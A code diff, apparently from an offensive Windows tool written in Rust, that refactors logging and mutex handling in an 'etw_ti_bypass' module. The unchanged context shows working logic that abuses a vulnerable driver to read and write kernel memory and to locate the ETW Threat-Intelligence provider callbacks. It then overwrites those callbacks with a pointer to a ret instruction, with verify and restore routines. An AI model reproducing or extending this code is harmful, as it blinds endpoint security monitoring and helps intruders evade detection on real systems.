@@ -76,6 +76,7 @@
 
 #![cfg(all(windows, feature = "kernel-callback"))]
 
+use common::lock::MutexExt;
 use crate::kernel_callback::deploy::{self, DeployedDriver};
 use crate::kernel_callback::discover;
 use crate::kernel_callback::driver_db::VulnerableDriver;
@@ -369,10 +370,10 @@ fn find_ret_address(
                 let mut buf = [0u8; 1];
                 if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                     if buf[0] == RET_BYTE {
-                        log::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                         return Ok(addr);
                     }
-                    log::warn!(
+                    tracing::warn!(
                         "etw_ti_bypass: IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
                         addr, buf[0]
                     );
@@ -383,10 +384,10 @@ fn find_ret_address(
                 let mut buf = [0u8; 4];
                 if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                     if u32::from_le_bytes(buf) == RET_U32 {
-                        log::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                         return Ok(addr);
                     }
-                    log::warn!(
+                    tracing::warn!(
                         "etw_ti_bypass: IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:08X}), scanning .text",
                         addr,
                         u32::from_le_bytes(buf)
@@ -395,7 +396,7 @@ fn find_ret_address(
             }
         }
         Err(e) => {
-            log::warn!("etw_ti_bypass: failed to resolve IoInvalidDeviceRequest: {}, scanning .text", e);
+            tracing::warn!("etw_ti_bypass: failed to resolve IoInvalidDeviceRequest: {}, scanning .text", e);
         }
     }
 
@@ -454,7 +455,7 @@ fn find_ret_address(
             for offset in (0..scan_size).step_by(16) {
                 if scan_buf[offset as usize] == RET_BYTE {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                     return Ok(ret_addr);
                 }
             }
@@ -462,7 +463,7 @@ fn find_ret_address(
             for (offset, &byte) in scan_buf.iter().enumerate() {
                 if byte == RET_BYTE {
                     let ret_addr = kernel_base + virtual_address + offset as u64;
-                    log::info!("etw_ti_bypass: found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!("etw_ti_bypass: found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                     return Ok(ret_addr);
                 }
             }
@@ -475,7 +476,7 @@ fn find_ret_address(
                 let off = offset as usize;
                 if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                     return Ok(ret_addr);
                 }
             }
@@ -484,7 +485,7 @@ fn find_ret_address(
                 let off = offset as usize;
                 if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!("etw_ti_bypass: found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!("etw_ti_bypass: found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                     return Ok(ret_addr);
                 }
             }
@@ -595,7 +596,7 @@ fn resolve_etw_ti_table(
             } else {
                 debugger_data_addr.wrapping_sub((-rel_offset) as u64)
             };
-            log::info!(
+            tracing::info!(
                 "etw_ti_bypass: resolved ETW-Ti table via EtwpDebuggerData (0x{:016X}) + 0x{:X} = 0x{:016X}",
                 debugger_data_addr,
                 rel_offset,
@@ -608,7 +609,7 @@ fn resolve_etw_ti_table(
     // Strategy 2: Absolute offset from kernel base.
     if let Some(abs_offset) = etw_ti_absolute_offset_for_build(build) {
         let table_addr = kernel_base + abs_offset;
-        log::info!(
+        tracing::info!(
             "etw_ti_bypass: resolved ETW-Ti table via absolute offset: kernel_base 0x{:016X} + 0x{:X} = 0x{:016X}",
             kernel_base,
             abs_offset,
@@ -651,7 +652,7 @@ fn walk_provider_callbacks(
         let callback_value = match kernel_read_u64(driver, device_handle, cr3, callback_addr) {
             Some(v) => v,
             None => {
-                log::debug!(
+                tracing::debug!(
                     "etw_ti_bypass: failed to read callback at 0x{:016X}, stopping walk",
                     callback_addr
                 );
@@ -668,7 +669,7 @@ fn walk_provider_callbacks(
         let next_ptr = match kernel_read_u64(driver, device_handle, cr3, current_ptr + 0x08) {
             Some(v) => v,
             None => {
-                log::debug!(
+                tracing::debug!(
                     "etw_ti_bypass: failed to read NextEntry at 0x{:016X}, stopping walk",
                     current_ptr + 0x08
                 );
@@ -678,7 +679,7 @@ fn walk_provider_callbacks(
 
         // Detect cycles (list should never cycle, but be defensive).
         if next_ptr == current_ptr {
-            log::warn!("etw_ti_bypass: detected self-referencing list entry at 0x{:016X}", current_ptr);
+            tracing::warn!("etw_ti_bypass: detected self-referencing list entry at 0x{:016X}", current_ptr);
             break;
         }
 
@@ -720,7 +721,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
     let kernel_base = discover::get_kernel_base()
         .context("failed to resolve kernel base address")?;
 
-    log::info!("etw_ti_bypass: kernel base: 0x{:016X}", kernel_base);
+    tracing::info!("etw_ti_bypass: kernel base: 0x{:016X}", kernel_base);
 
     // Step 3: Resolve CR3 (if driver requires physical addresses).
     let cr3 = if driver.needs_physical_addr {
@@ -740,7 +741,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
         )
     })?;
 
-    log::info!(
+    tracing::info!(
         "etw_ti_bypass: build={}, callback_offset=0x{:X}",
         build,
         callback_offset
@@ -753,7 +754,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
     let ret_address = find_ret_address(driver, device_handle, kernel_base, cr3)
         .context("failed to find ret address in kernel")?;
 
-    log::info!("etw_ti_bypass: using ret address: 0x{:016X}", ret_address);
+    tracing::info!("etw_ti_bypass: using ret address: 0x{:016X}", ret_address);
 
     // Step 7: Read the 6-entry provider array and walk each provider's callbacks.
     let mut result = EtwTiBypassResult {
@@ -766,7 +767,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
 
     // Clear any previous backups.
     {
-        let mut guard = BACKUPS.lock().unwrap();
+        let mut guard = BACKUPS.lock_recover();
         guard.clear();
     }
 
@@ -794,7 +795,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
             continue;
         }
 
-        log::info!(
+        tracing::info!(
             "etw_ti_bypass: {} reg_entry at 0x{:016X}, walking callbacks",
             provider,
             reg_entry_ptr
@@ -847,7 +848,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
                             ret_address,
                         };
                         {
-                            let mut guard = BACKUPS.lock().unwrap();
+                            let mut guard = BACKUPS.lock_recover();
                             guard.push(backup);
                         }
 
@@ -856,7 +857,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
                             "NUKE {}[{}] 0x{:016X} -> ret (0x{:016X})",
                             provider, j, original_value, ret_address
                         ));
-                        log::info!(
+                        tracing::info!(
                             "etw_ti_bypass: overwrote {}[{}] 0x{:016X} -> 0x{:016X}",
                             provider,
                             j,
@@ -870,7 +871,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
                             "FAIL {}[{}] — readback mismatch: expected 0x{:016X}, got 0x{:016X}",
                             provider, j, ret_address, v
                         ));
-                        log::warn!(
+                        tracing::warn!(
                             "etw_ti_bypass: readback mismatch for {}[{}]: expected 0x{:016X}, got 0x{:016X}",
                             provider,
                             j,
@@ -892,7 +893,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
                     "FAIL {}[{}] — kernel_write failed at 0x{:016X}",
                     provider, j, callback_addr
                 ));
-                log::warn!(
+                tracing::warn!(
                     "etw_ti_bypass: failed to write {}[{}] at 0x{:016X}",
                     provider,
                     j,
@@ -902,7 +903,7 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
         }
     }
 
-    log::info!(
+    tracing::info!(
         "etw_ti_bypass: complete: {} overwritten, {} skipped, {} failed",
         result.overwritten,
         result.skipped,
@@ -944,7 +945,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
 
     // Take ownership of all backups.
     let mut backups = {
-        let mut guard = BACKUPS.lock().unwrap();
+        let mut guard = BACKUPS.lock_recover();
         std::mem::take(&mut *guard)
     };
 
@@ -956,7 +957,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
             match readback {
                 Some(v) if v == backup.original_value => {
                     result.restored += 1;
-                    log::info!(
+                    tracing::info!(
                         "etw_ti_bypass: restored {}[{}] at 0x{:016X} to original 0x{:016X}",
                         backup.provider,
                         backup.index,
@@ -966,7 +967,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
                 }
                 Some(v) => {
                     result.failed += 1;
-                    log::warn!(
+                    tracing::warn!(
                         "etw_ti_bypass: restore readback mismatch for {}[{}]: expected 0x{:016X}, got 0x{:016X}",
                         backup.provider,
                         backup.index,
@@ -977,7 +978,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
                 None => {
                     // The write may have succeeded even though readback failed.
                     result.restored += 1;
-                    log::info!(
+                    tracing::info!(
                         "etw_ti_bypass: restored {}[{}] at 0x{:016X} (readback failed, assuming success)",
                         backup.provider,
                         backup.index,
@@ -987,7 +988,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
             }
         } else {
             result.failed += 1;
-            log::warn!(
+            tracing::warn!(
                 "etw_ti_bypass: failed to restore {}[{}] at 0x{:016X}",
                 backup.provider,
                 backup.index,
@@ -996,7 +997,7 @@ pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
         }
     }
 
-    log::info!(
+    tracing::info!(
         "etw_ti_bypass: restore complete: {} restored, {} failed",
         result.restored,
         result.failed
@@ -1056,14 +1057,14 @@ pub fn verify_etw_ti_disabled() -> Result<bool> {
 
     // Determine what the ret address should be by looking at the first backup.
     let ret_address = {
-        let guard = BACKUPS.lock().unwrap();
+        let guard = BACKUPS.lock_recover();
         guard.first().map(|b| b.ret_address).unwrap_or(0)
     };
 
     if ret_address == 0 {
         // No backups — either never bypassed or already restored.
         // Check if there are any non-zero callbacks.
-        log::debug!("etw_ti_bypass: no backups found — ETW-Ti may not have been disabled");
+        tracing::debug!("etw_ti_bypass: no backups found — ETW-Ti may not have been disabled");
         return Ok(false);
     }
 
@@ -1092,7 +1093,7 @@ pub fn verify_etw_ti_disabled() -> Result<bool> {
         for (_, callback_value) in &callbacks {
             if *callback_value != 0 && *callback_value != ret_address {
                 all_disabled = false;
-                log::warn!(
+                tracing::warn!(
                     "etw_ti_bypass: {} callback 0x{:016X} is NOT disabled",
                     provider,
                     callback_value
@@ -1102,7 +1103,7 @@ pub fn verify_etw_ti_disabled() -> Result<bool> {
     }
 
     if all_disabled {
-        log::info!("etw_ti_bypass: verification passed — all ETW-Ti callbacks disabled");
+        tracing::info!("etw_ti_bypass: verification passed — all ETW-Ti callbacks disabled");
     }
 
     Ok(all_disabled)
@@ -1116,7 +1117,7 @@ pub fn etw_ti_status() -> EtwTiStatus {
     let build_supported = etw_ti_table_offset_for_build(build).is_some()
         || etw_ti_absolute_offset_for_build(build).is_some();
 
-    let backups = BACKUPS.lock().unwrap();
+    let backups = BACKUPS.lock_recover();
     let callbacks_overwritten = backups.len();
     let disabled = callbacks_overwritten > 0;
 
@@ -1204,7 +1205,7 @@ mod tests {
     fn test_backup_storage() {
         // Verify that the backup storage starts empty.
         {
-            let guard = BACKUPS.lock().unwrap();
+            let guard = BACKUPS.lock_recover();
             assert!(guard.is_empty());
         }
     }
